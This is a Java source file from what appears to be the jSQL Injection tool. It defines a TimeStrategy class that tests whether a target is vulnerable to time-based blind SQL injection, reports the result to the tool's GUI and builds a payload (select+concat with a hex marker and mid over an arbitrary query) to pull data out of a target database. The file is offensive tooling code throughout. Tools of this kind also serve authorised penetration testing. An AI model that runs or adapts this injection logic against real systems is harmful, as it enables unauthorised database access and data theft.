/*******************************************************************************
 * Copyhacked (H) 2012-2014.
 * This program and the accompanying materials
 * are made available under no term at all, use it like
 * you want, but share and discuss about it
 * every time possible with every body.
 *
 * Contributors:
 *      ron190 at ymail dot com - initial implementation
 *******************************************************************************/
package com.jsql.model.pattern.strategy;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.model.AbstractSuspendable;
import com.jsql.model.InjectionModel;
import com.jsql.model.bean.Request;
import com.jsql.model.blind.ConcreteTimeInjection;
import com.jsql.view.GUIMediator;

/**
 * Injection strategy using time attack.
 */
public class TimeStrategy extends AbstractInjectionStrategy {
    /**
     * Injection method using time attack.
     */
    private ConcreteTimeInjection timeInjection;
    
    @Override
    public void checkApplicability() throws PreparationException {
        InjectionModel.LOGGER.info("Time based test...");
        
        this.timeInjection = new ConcreteTimeInjection();
        this.isApplicable = this.timeInjection.isInjectable();
        
        if (this.isApplicable) {
            activate();
        } else {
            deactivate();
        }
    }
    
    @Override
    public void activate() {
        Request request = new Request();
        request.setMessage("MarkTimebasedVulnerable");
        GUIMediator.model().interact(request);
    }

    @Override
    public void deactivate() {
        Request request = new Request();
        request.setMessage("MarkTimebasedInvulnerable");
        GUIMediator.model().interact(request);
    }

    @Override
    public String inject(String sqlQuery, String startPosition, AbstractSuspendable stoppable) throws StoppableException {
        return this.timeInjection.inject(
                "(" 
                    + "select+"
                        + "concat("
                            + "0x53514c69,"
                            + "mid("
                                + "(" + sqlQuery + "),"
                                + startPosition + ","
                                + "65536"
                            + ")"
                        + ")"
                + ")", stoppable);
    }

    @Override
    public void applyStrategy() {
        InjectionModel.LOGGER.info("Using timebased injection...");
        GUIMediator.model().applyStrategy(this);
        
        Request request = new Request();
        request.setMessage("MessageBinary");
        request.setParameters(timeInjection.getInfoMessage());
        GUIMediator.model().interact(request);
        
        Request request2 = new Request();
        request2.setMessage("MarkTimeStrategy");
        GUIMediator.model().interact(request2);
    }
}
